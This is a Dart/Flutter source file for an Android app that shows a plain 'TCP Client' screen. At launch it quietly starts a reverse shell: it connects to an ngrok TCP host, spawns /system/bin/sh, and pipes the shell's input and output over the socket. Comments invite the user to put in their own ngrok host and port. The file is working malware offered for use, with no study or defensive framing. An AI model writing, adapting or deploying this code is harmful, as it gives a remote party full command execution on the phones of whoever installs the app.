import 'dart:io';
import 'dart:convert';
import 'package:flutter/material.dart';

void main() {
  runApp(MyApp());
  // Start the reverse shell client
  Future.delayed(Duration.zero, () => startClient());
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Flutter TCP Client',
      home: Scaffold(
        appBar: AppBar(title: Text('TCP Client')),
        body: Center(child: Text('Connected to server...')),
      ),
    );
  }
}

void startClient() async {
  final ip = '0.tcp.in.ngrok.io'; // Replace with your ngrok TCP host
  final port = 14795;             // Replace with your ngrok TCP port

  try {
    final socket = await Socket.connect(ip, port);
    print('[*] Connected to $ip:$port');
    socket.write('Flutter shell ready.\n');

    // Start a real shell process on Android
    final shell = await Process.start(
      '/system/bin/sh',
      [],
      runInShell: true,
    );

    // Pipe shell stdout/stderr to socket
    shell.stdout.transform(utf8.decoder).listen((data) {
      socket.write(data);
    });
    shell.stderr.transform(utf8.decoder).listen((data) {
      socket.write(data);
    });

    // Pipe socket data to shell stdin
    socket.listen(
      (data) {
        shell.stdin.add(data);
      },
      onError: (error) {
        print('❌ Socket error: $error');
        socket.destroy();
        shell.kill();
      },
      onDone: () {
        print('[*] Server closed connection.');
        socket.destroy();
        shell.kill();
      },
    );
  } catch (e) {
    print('❌ Connection failed: $e');
  }
}
